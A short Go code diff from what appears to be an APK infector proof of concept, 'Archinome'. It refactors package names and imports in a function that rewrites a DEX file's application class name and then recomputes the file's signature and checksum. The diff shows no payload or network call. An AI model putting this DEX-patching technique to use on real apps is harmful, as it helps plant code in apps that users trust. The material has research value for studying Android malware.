@@ -1,14 +1,14 @@
-package mydex
+package dex
 
 import (
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 	"bytes"
-	"common"
 	"crypto/sha1"
 	"encoding/binary"
 	"hash/adler32"
 	"io/ioutil"
 	"log"
-	"manifest"
 	"path/filepath"
 	"strings"
 )
@@ -96,6 +96,7 @@ func Patch() {
 
 	// we should add "L" and ";", and convert "."->"/" to be a normal DEX string
 	//tmpName := "z.z.zzzzzzzzzzzzzzzz"
+	
 	oldAppNameNormalized := "L" + strings.ReplaceAll(manifest.OldAppNameUTF8, ".", "/") + ";"
 	//oldAppNameNormalized := "L" + strings.ReplaceAll(tmpName, ".", "/") + ";"
 	newAppName := oldAppNameNormalized + "\x00"
@@ -205,5 +206,5 @@ func Patch() {
 	patchSignature(data[0:])
 	patchChecksum(data[0:])
 
-	common.WriteChanges(data, dexPathNew)
+	injector.WriteChanges(data, dexPathNew)
 }
